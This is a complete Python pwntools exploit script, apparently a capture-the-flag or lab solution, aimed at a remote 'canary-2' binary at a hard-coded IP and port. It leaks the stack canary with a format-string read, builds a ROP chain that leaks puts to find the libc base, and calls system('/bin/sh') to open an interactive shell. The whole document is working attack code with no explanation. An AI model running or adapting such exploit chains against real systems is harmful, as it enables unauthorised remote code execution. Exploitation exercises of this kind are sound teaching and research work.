from pwn import *

BIN = './canary-2'
# p = process(BIN)
p = remote('141.85.224.106', 31343)
elf = ELF(BIN)
rop = ROP(BIN)

# LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC = './libc.so.6'
libc = ELF(LIBC)

buff_len = 0x20 - 8
p.recvuntil(b'[y/n]\n')
payload1 = b'y' + b'%9$llx'
p.sendline(payload1)

canary_str = p.recvline().rstrip()
canary_str = canary_str[canary_str.find(b'y')+1:].decode()
canary = bytearray.fromhex(canary_str)
canary.reverse()

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

p.recvuntil(b'[y/n]\n')
payload2 = b'y' * buff_len + canary + b'a' * 8 + p64(rdi) + p64(elf.got['puts']) \
	+ p64(elf.symbols['puts']) + p64(elf.symbols['run'])
p.sendline(payload2)
p.recvuntil(b'[y/n]\n')
p.sendline(b'n')

p.recvline()
leak = p.recvline().rstrip()
puts = u64(leak + b'\x00' * (8 - len(leak)))
libc.address = puts - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh\x00'))

p.recvuntil(b'[y/n]\n')
payload3 = b'y' * buff_len + canary + b'a' * 8 + p64(ret) + p64(rdi) \
	+ p64(bin_sh) + p64(libc.symbols['system'])
p.sendline(payload3)

p.recvuntil(b'[y/n]\n')
p.sendline(b'n')
p.recvline()

p.interactive()
